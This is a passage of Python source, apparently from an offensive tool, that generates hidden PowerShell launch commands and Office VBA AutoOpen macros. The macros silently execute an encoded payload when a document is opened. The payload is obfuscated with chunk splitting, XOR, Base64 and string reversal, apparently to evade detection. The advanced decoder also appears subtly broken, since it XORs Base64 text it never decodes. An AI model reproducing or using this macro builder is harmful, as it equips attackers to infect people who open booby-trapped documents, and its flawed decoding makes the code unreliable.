            obfuscation_level: 'none', 'basic', 'advanced'
        
        Returns:
            One-liner PowerShell command
        """
        if obfuscation_level == "advanced":
            # Advanced: Split into chunks + XOR obfuscation
            return PowerShellEncoder._advanced_obfuscate(code)
        elif obfuscation_level == "basic":
            # Basic: String splitting
            return PowerShellEncoder._basic_obfuscate(code)
        else:
            # None: Direct encoding
            return PowerShellEncoder._simple_encode(code)
    
    @staticmethod
    def _simple_encode(code: str) -> str:
        """Simple Base64 encoding"""
        b64 = PowerShellEncoder.encode_to_base64(code)
        return f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}'
    
    @staticmethod
    def _basic_obfuscate(code: str) -> str:
        """
        Basic obfuscation: Split encoded payload into 3-4 chunks
        VBA'da bu chunks'ları birleştir ve çalıştır
        """
        b64 = PowerShellEncoder.encode_to_base64(code)
        
        # Chunk size
        chunk_size = len(b64) // 3
        chunks = [
            b64[0:chunk_size],
            b64[chunk_size:chunk_size*2],
            b64[chunk_size*2:]
        ]
        
        # VBA uyumlu output (chunks)
        vba_code = 'Sub AutoOpen()\n'
        vba_code += '    Dim cmd As String\n'
        vba_code += f"    Dim part1 As String: part1 = \"{chunks[0]}\"\n"
        vba_code += f"    Dim part2 As String: part2 = \"{chunks[1]}\"\n"
        vba_code += f"    Dim part3 As String: part3 = \"{chunks[2]}\"\n"
        vba_code += '    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " & part1 & part2 & part3\n'
        vba_code += '    CreateObject("WScript.Shell").Run cmd, 0, False\n'
        vba_code += 'End Sub\n'
        
        return vba_code
    
    @staticmethod
    def _advanced_obfuscate(code: str) -> str:
        """
        Advanced obfuscation: XOR + Base64 + String reverse + multiple layers
        """
        import base64
        
        # Step 1: Base64 encode
        b64 = PowerShellEncoder.encode_to_base64(code)
        
        # Step 2: Simple XOR cipher (byte-level)
        xor_key = random.randint(0x01, 0xFF)
        xor_bytes = bytearray([ord(c) ^ xor_key for c in b64])
        xor_b64 = base64.b64encode(xor_bytes).decode('ascii')
        
        # Step 3: Reverse
        reversed_xor = xor_b64[::-1]
        
        # VBA uyumlu multi-layer decoder
        vba_code = 'Sub AutoOpen()\n'
        vba_code += '    Dim encoded As String\n'
        vba_code += f'    encoded = "{reversed_xor}"\n'
        vba_code += '    \n'
        vba_code += '    Dim decoded As String\n'
        vba_code += '    decoded = StrReverse(encoded)\n'
        vba_code += '    \n'
        vba_code += f'    Dim xorKey As Integer: xorKey = {xor_key}\n'
        vba_code += '    Dim i As Integer\n'
        vba_code += '    Dim xorDecoded As String\n'
        vba_code += '    xorDecoded = ""\n'
        vba_code += '    For i = 1 To Len(decoded)\n'
        vba_code += '        xorDecoded = xorDecoded & Chr(Asc(Mid(decoded, i, 1)) Xor xorKey)\n'
        vba_code += '    Next i\n'
        vba_code += '    \n'
        vba_code += '    Dim cmd As String\n'
        vba_code += '    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " & xorDecoded\n'
        vba_code += '    CreateObject("WScript.Shell").Run cmd, 0, False\n'
        vba_code += 'End Sub\n'
        
        return vba_code
    
    @staticmethod
    def minify_powershell(code: str) -> str:
        """Remove comments and whitespace from PowerShell code"""
        # Remove comment lines
        lines = [line for line in code.split('\n') if not line.strip().startswith('#')]
        # Join and minimize whitespace
        minified = ' '.join(line.strip() for line in lines if line.strip())
        return minified